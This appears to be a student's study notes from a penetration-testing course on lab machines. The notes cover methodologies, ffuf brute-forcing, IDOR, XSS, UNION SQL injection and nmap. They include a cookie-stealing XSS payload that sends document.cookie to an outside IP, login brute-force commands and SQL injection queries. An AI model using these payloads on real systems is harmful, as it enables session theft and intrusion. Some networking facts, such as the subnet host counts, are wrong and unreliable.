### Notes bout jr pentester path

Roles in cyber security can look almost the same but they have little differences, and in a pentester job you will have a ROE(Rules of engagement). ROE is a form document that will define the permission,test scope and rules of a penetration test.

now below it will have some general themes of methodologies that you probably will follow in a pentester job 
1. Information Gathering.
2. Enumeration.
3. Exploitation.
4. Privilege Escalation.
5. Post Exploitation.
- you already exploited the enterprise or whatever it be, but in this stage you will searching for more things that you can compromise or some additional data you can get.
- after all you need to report all and etc.

OSSTMM(The Open Source Security Testing Methodology Manual) is a methodology that covers more about wired connections, wirelles and telecommunications, that means is more to network and physical stuff.
Some features about this methodology is:
- covers a lot of testing strategies.
- can be very detailed,a little difficult to understand and tend to be quite unique.
- as i said before, tend to focuses more in specific targets such Telecommunications, Wired connections and Wireless connections.
To start making an OSSTMM test you will need to track what you test (the targets), how you test them (the
parts of the targets tested and not the tools or techniques used), the types of controls discovered, and
what you did not test (targets and parts of the targets). And it's apllied to another methodologies too! 

OWASP(The Open Web Application Security Project methodology) is the most famous methodology and it covers the ten most reported vulnerabilities in web applications and web servers.
(good question is if have a methodology to software and binaries :)
some features about this methodology is:
- easy to understand.
- frequently updated.
- covers all states of engagements.
- web applications and web services.

The NIST Cyber Security Framework, what i've understand is this framework is the most used and covers more about general stuff, may i need to look at this framework again
features:
- frequently updated.
- use a lot of other frameworks so its a quite difficult to understand.
- dont cover cloud security which is getting more popular.
- weak auditing policies which makes the life of blue time and response of incidents roles a quite difficult.
- NIST provides accreditation. 
there is CAF(Cyber Security Framework) is a new framework with fourteen principles and is made for enterprises that perform "vitally important services and activities"

CIA TRIAD is about some pilars from security.
confidentiality - the protection to data from unauthorized access.
integrity - the data can be altered, hash and certified help with this.
availability - the service needs to be available the most part of time, an ddos attack break the availability pilar.
PIM and PAM is one of that security principles to and a methodology of privileges in applications and it depends on the situation and circumstances to choose which one you will use. The main difference between PIM(Privilege Identity Management) and PAM(Privilege Access Management) is that PIM addresses what access a user is already granted, while PAM addresses how to monitor and control access whenever a user requests access to a resource.

doing some practices stuff right now so...
did you know that was possible to find subdomains searching TTL/SSL certifies?

Virtual Hosts to discover subdomains, another way to discover subdomains. Some subdomains are not visible and public acessible such as development versions of web applications or administration portals, so the dns record needs to be kept on a private dns server or in developer's machines in /etc/hosts or c:\windows\system32\drivers\etc\hosts. To "bypass" it you can especify some names or brute force the HOST header when you make a request in a website and see if there is an response. Let me give a example using fuff to bruteforce the DNS.

ffuf -v -c -w /usr/share/wordlists/Seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.125.79
-v flag means verbose output and -c means colored output
run that command and you will see that every attempt is a valid response, so you will filter with the size that comes with the response using -fs {size}.

xss using the mime sniffing, mime sniffing is the browser look at the Content-Type header in the http response for and indication of how the response should be interpreted, but browsers also have some algorithms to figure out what is the type of the content and change the Content-Type if the webserver give permission too.

Content-Type header is a important header that can lead a some vulnerabilities like Cross-Site-Script. MIME stands for Multipurpose Internet Mail Extension, Content-Type header fields include a MIME type of an  http response, to tell the browser what kind of data is present in http response. MIME Sniffing is a technique used by browsers to determine the content type of an http response using the magic bytes present in response. So if the response comes with html to render the page, the response needs to be with text/html in Content-Type header.
Now talking about vulnerabilities, if a unknown or MIME sniffing is allowed, MIME sniffing will take action to try to understand what type of content is it and if the content resembles HTML, browser might understand it as html even if the content-type is not set to text/html and make it executable, maybe elevate it to a lfi but i need to study more about xss and this mime sniffing vulnerability. good source https://infosecwriteups.com/content-security-policy-bypass-to-perform-xss-3c8dd0d40c2e ;;; cool bypass of CSP using mime sniffing !!

$ ffuf -c -v -w /usr/share/wordlists/Seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.167.0/customers/signup -mr "username already exists"
that is the syntax to brute force a login using ffuf, quite beautiful output than hydra ngl.

you can use variables and more than one wordlists in yours bruteforce using the -w flag, look

$ ffuf -c -v -w usernames.txt:W1,/usr/share/wordlists/Seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2"-H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.167.0/customers/login -fc 200

IDOR is a type of vulnerability you can have access to see data you shouldn't have. like in hackerdosbem.com, this vulnerability can occur when the web server don't check the input from user for some reason. Another example can be: imagine that you want to change your profile information in a website, so you click on some link and go to (http://online-service.thm/profile?user_id=1305). If the web site dont check if this user request is really you, you can easily just change the id and get another users data. Instead of finding a idor vulnerability on a website url, maybe your data are being loaded from an request to something, you can check this using the devtools in browser or intercept all connections using an software like burp 

/etc/issue - that system identification before the login prompt.
/etc/profile - some system-wide variables.
/proc/version - kernel version.
/var/log/dmmessage - global system messages.
/root/.ssh/id_rsa - private ssh key
that is a good room to understand a little more about vpns, network and firewalls https://tryhackme.com/room/extendingyournetwork

there is 4 differents types of xss, first of them and the more dangerous is the "storaged xss" is when your code is really storaged in the website, so anyone that access it after you injected the code, will execute your payload. You can find them in inputs that are storaged like comments, profile information and etc. The second is "reflected xss", can occur when parameters that are loaded with http/https request isn't validated and you can add a payload and send the url(with the payload) to someone, e.g. "https://www.mywebsite.com/blogcomments?error=error-message" is a valid url with a parameter r to make a error message, "https://www.mywebsite.com/blogcomments?error=<script> SteelTheirCookies(User); </script>" is the same url but instead of the error parameter, is a function to steel yourcookies using xss vulnerability to inject javascript code. "blind xss" is almost the same as storaged xss but you cant test your payload or see if it's working because your payload are being storaged in another site or local, to exploit you need a callback(normally a http or https request) to an website to test if your payload is working.

to explain the dom xss im gonna give a example below:
you have a form to enter your name, when you do this, is created a <span> with class 'name' and a <script> section with this dom script.
document.getElementsByClassName('name')[0].innerHTML='moraes';
how can u bypass this?
';<script>alert('fuck')</script>;//
the single quotes are to close the value of the innerHTML, add a semicolon to start another command, then add your payload and after all that you need to add two slashs to comment out everything that follows your payload. Another advice is that some tags like <img> has attributes to execute code(events), so instead of trying to bypass filters you can just e.g. /images/cats.jpg" onload="alert('THM');

stealing cookies using xss, you find a xss when you open a ticket on "http://10.10.115.223/customers/tickets", let's start to make the payload to sealing staff's cookie. It's a better ideacreate payloads at baby steps to avoid stupids erros and filters. First of all lets see how the site works when i insert "something":
<td>something></td>
ok so lets try to escape this tag by simple closing it, "</td>something"
<td>></td>something 
worked so lets try to insert javascript on it, "</td><script>alert('testing');</script>"
and a message pops up :)
now the final stage is to create the payload to steel the cookie, to do it you will need the fetch function to make a http request and send this request to you.
onerror=eval('al&#x5c;u0065rt(1)') src="http://127.0.0.1:3000/__sinatra__/404.png"
"</td> <script>fetch('http://10.8.45.95:1234?cookie=' + btoa(document.cookie) ); </script>"

btoa is a method to convert text to base64 and im using it to avoid any erros.

you need to study a little more about sql injection or even about making sql queries because create a properly query to an datebase can be hard but create a query to a database while trying to bypass filter and sqlinjection defenses can be a LOT harder and stressfull, but im gonna help you here and now. First of all you need a sqlinjection(obviously) and to test if some parameters actually has a sqlinjection you can add a ' and wait for a 500 error that means Internal Server Error. If u are a lucky guy, an error with the query will pop up, if u are unlucky you will have a blind sqli. Just to make sure add a valid sql syntax and see if you are receving a 200 status code. 
So i have a sqli at "/about/1" lets start trying some payloads to discover version, tables name, databases names, columns and everything. To do this i need a UNION statement to put two commands outputs together. 
To use UNION statement you need to make sure that:
1. How many columns are being returned by the first query.
2. What types of data which columns in the first query have.

tips to test if it is really a valid injection: 
```
'	False
''	True
"	False
""	True
\	False
\\	True
```

this sqlinjection is a quite easier than others because it gives all you need in the error message, the numbers of columns, names of the columns, name of the database and the all query that are being executed. So now i know that the query is requesting five columns with names firstName, lastName, pfpLink, role, bio from people database and now that i know the name of the batabase i can leak the name of all columns, usins this query below:

`0 union all select group_concat(column_name),null,null,null,null from information_schema.columns where table_name="people"`

let me explain everyhing you need to know here, first of all the zero is to dont receiving any valid content from first query to only see my second query output. After the query has the "union all select",im trying to select an column called column_name from the table columns that is inside information_schema database and after all i filter the results to include only the data from table "people" and the group_concat is the part where the query will receive all responses and put it together in one string. 
information_schema = database.
information_schema.columns = table.
column_name = column field inside information_schema.columns table.
As im here to leak a flag is safe to take note as my target column, lets start to leak some notes changing the query a little and go on increasing the id number.

`0 union all select notes,null,null,null,null from people where id=1`

Exists two types of reconnaissence, active and passive. Passive is like just searching and not directly connect to them(them is related to your current target) some tools or programs that do a passive reconnaissence is dnslookup, whois, dnsdumpster and shodan.io. These are just examples but you can find a lot more tools about reconnaissence. Now about active reconnaissence is more directly but yet using open and publicly available service from your target, but here enter things link ping the server, using tools that stablish a connection or even made contact with internal services using social enginnering or something like this. Some tools to do a active reconnaissence is traceroute, ping, netcat, nmap, telnet and go on.

Subnets is like a small network, but its stands inside of a bigger network. Networks has subnets, the greater is the subnet mask smaller is the range of ip addresses in the network, an subnet mask of /24 has a range of 250hosts, but a subnet mask of /14 has around 65 thousand of hosts. ARP(Address Resolution Protocol) can be really useful to discover live hosts but only if you are already inside the network, because it works sending a query to broadcast only to discover the MAC address of a specific address. If the specific address exists in the network, a arp response will be received with the mac address of the specific ip address of the query. So if you already compromised an machine inside the network, ARP protocol to discovery and make a pivot maybe. Ping requests needs a arp before to send the real echo ping packet, but only in the first time after it, arp probably storage the data in cache or something.

If a privileged user tries to scan target on a local network, nmap uses ARP requests, but when an privileged user tries to scan targets outside the local network, nmap uses icmp echo request(ping), tcp ACK(acknowlege) to port 80, syn and icmp timestamp requests.

So as you are already know, nmap is really POWERFUL tool to reconnaissence and enumerate networks or targets, sometimes you'll need specific flags or ways to enumerate some hosts but im not going to documentate all flags and differences between them here because you can easily find them just doing a man nmap or even going to nmap documentation. Normally nmap is used using -sS what means to make a stealth SYN scan, why stealth? Because it never complete a tcp connection, it sends a TCP packet with the SYN Flag set to see if the port is open or there is a available service on it, a syn/ack response is received if the port is open, no response means filtered and a TCP packet with Reset Flag as response means the port is closed. The real thing is if you are just a nerd using tools and don't know HOW to use them, sometime you're going to fuck yourself trying to enumerate ports like this:
`sudo nmap -sS -sV $ip` 
-sV flag will make nmap collect info to determine the service running on a specific open port, that means -sV will force nmap to proceed with a tcp 3-way handshake and establish the connection with the live hosts, so you're not stealth anymore. NSE(Nmap Scripting Engine) is a lua interpreter inside of nmap that allows the execution of Lua Scripts, the flag -sC will use default scripts(which probably is a bunch of them) to make enumerations, all scripts can be found at /usr/share/nmap/scripts/ folder.
